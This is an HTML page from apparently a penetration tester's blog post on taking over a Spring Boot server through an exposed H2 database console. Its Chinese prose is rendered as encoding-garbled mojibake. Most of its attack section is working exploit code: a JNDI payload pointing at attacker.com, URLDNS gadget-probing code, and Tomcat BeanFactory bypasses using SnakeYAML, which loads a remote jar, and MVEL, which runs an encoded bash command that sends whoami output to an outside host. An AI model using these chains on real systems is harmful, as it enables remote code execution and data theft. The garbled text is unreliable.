<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ä»Spring Boot H2 Databaseåˆ°GetShell | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="0x1. åˆ‡å…¥ç‚¹åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª/consoleçš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼šå¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨JNDIæ³¨å…¥æ¼æ´.
è®¾ç½®Driver Classä¸ºjavax.naming.InitialContextï¼ŒJDBC URLä¸ºldap://attacker.com/Exploitï¼šæ ¹æ®/envæ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚

RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º trueLDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true

0x2. ç»•è¿‡å’Œåˆ©ç”¨åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š

Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾
æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget
è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget

URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…1.serï¼š
package test;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import javassist.ClassPool;
import javassist.CtClass;


public class Urldns &amp;#123;
    public static void main(String[] args) throws Exception &amp;#123;
        HashMap hashMap = new HashMap();
          URL url = new URL(&#34;http://333.f9575af1.dns.1433.eu.org&#34;);
          Field f = Class.forName(&#34;java.net.URL&#34;).getDeclaredField(&#34;hashCode&#34;);
          f.setAccessible(true);
          f.set(url, 1);
          //hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);
          hashMap.put(url, makeClass(&#34;org.apache.commons.beanutils.BeanComparator&#34;));
          f.set(url, -1);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;1.ser&#34;));
        oos.writeObject(hashMap);
        //ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&#34;1.ser&#34;));
        //ois.readObject();
    &amp;#125;
    public static Class makeClass(String clazzName) throws Exception&amp;#123;
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    &amp;#125;
&amp;#125;"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="ä»Spring Boot H2 Databaseåˆ°GetShell"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> ä»Spring Boot H2 Databaseåˆ°GetShell</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="0x1-åˆ‡å…¥ç‚¹"><a href="#0x1-åˆ‡å…¥ç‚¹" class="headerlink" title="0x1. åˆ‡å…¥ç‚¹"></a>0x1. åˆ‡å…¥ç‚¹</h2><p>åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª<code>/console</code>çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨<a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1078">JNDIæ³¨å…¥æ¼æ´</a>.</p>
<p>è®¾ç½®<code>Driver Class</code>ä¸º<code>javax.naming.InitialContext</code>ï¼Œ<code>JDBC URL</code>ä¸º<code>ldap://attacker.com/Exploit</code>ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>æ ¹æ®<code>/env</code>æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚</p>
<blockquote>
<p>RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true<br>LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true</p>
</blockquote>
<h2 id="0x2-ç»•è¿‡å’Œåˆ©ç”¨"><a href="#0x2-ç»•è¿‡å’Œåˆ©ç”¨" class="headerlink" title="0x2. ç»•è¿‡å’Œåˆ©ç”¨"></a>0x2. ç»•è¿‡å’Œåˆ©ç”¨</h2><h3 id="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡"><a href="#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡" class="headerlink" title="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡"></a>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡</h3><p>åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li>
</ul>
<p>URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…<code>1.ser</code>ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>
          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>
        <span class="token comment">//ois.readObject();</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å› ä¸ºåŠ¨æ€ç”Ÿæˆçš„ç±»ä¹Ÿå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œå› æ­¤ä¸Šé¢ä»£ç ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®ï¼Œæœ€å¥½åœ¨å¦å¤–ä¸€ä¸ªç¯å¢ƒé‡Œé¢ååºåˆ—åŒ–æµ‹è¯•ã€‚<br>postè¯·æ±‚æäº¤ä¸Šé¢ç”Ÿæˆçš„<code>1.ser</code>åˆ°<code>/yso</code>æ¥å£ï¼Œå¦‚æœç”Ÿæˆ<code>1.ser</code>é‡Œé¢çš„ç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å­˜åœ¨ï¼Œåˆ™ä¼šæ”¶åˆ°dnslogè¯·æ±‚ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@ResponseBody</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç‚å­—è¾ˆå¸ˆå‚…å·²ç»å†™å¥½äº†<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns">URLDNS</a>ï¼Œå¯ä»¥ç”Ÿæˆæ¢æµ‹éœ€è¦çš„åºåˆ—åŒ–æ•°æ®åŒ…ã€‚å½“å­˜åœ¨JNDIæ³¨å…¥çš„æ—¶å€™ï¼Œå¯åŠ¨LDAPæœåŠ¡:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>ï¼Œç„¶åä½¿ç”¨PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>ã€‚</p>
<h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>å€Ÿç”¨Ceye.ioæ¢æµ‹H2 Databaseçš„é¡µé¢ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨çš„é“¾å¾ˆå¤šï¼Œæ¯”å¦‚<code>cc1, cb17ã€mvelã€snakeyaml</code>ç­‰ï¼Œå…¶ä¸­<code>cc1ã€cb17</code>è¿™äº›é“¾å±äºLDAPååºåˆ—åŒ–ï¼Œ<code>mvelã€snkeyaml</code>å±äºåŠ è½½æœ¬åœ°Classã€‚<br>æµ…è“å¸ˆå‚…åœ¨<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>é‡Œé¢è®²çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>snkeyml</code>æ”»å‡»ï¼Œä¸»è¦åˆ©ç”¨ä»£ç ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>
            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
            <span class="token string">"]"</span><span class="token punctuation">;</span>
    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> ref<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨æœåŠ¡ç«¯ä½¿ç”¨RMIæ‰˜ç®¡ï¼Œç„¶åå¼€å¯<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p>
<h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>åœ¨æ›´æ¢MVELæ‰§è¡Œçš„æ—¶å€™ï¼Œæœ¬åœ°æµ‹è¯•å¼¹è®¡ç®—å™¨æˆåŠŸï¼Œä½†æ˜¯æ¢æˆæ‰§è¡Œå‘½ä»¤å°±ä¼šå¤±è´¥ï¼Œä½¿ç”¨IDEAæœ¬åœ°è°ƒè¯•ä¹‹åå‘ç°æŠŠpushå»æ‰ï¼Œç„¶åå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œå…·ä½“åŸå› éœ€è¦å†è·Ÿè¸ªä¸€éï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
<span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


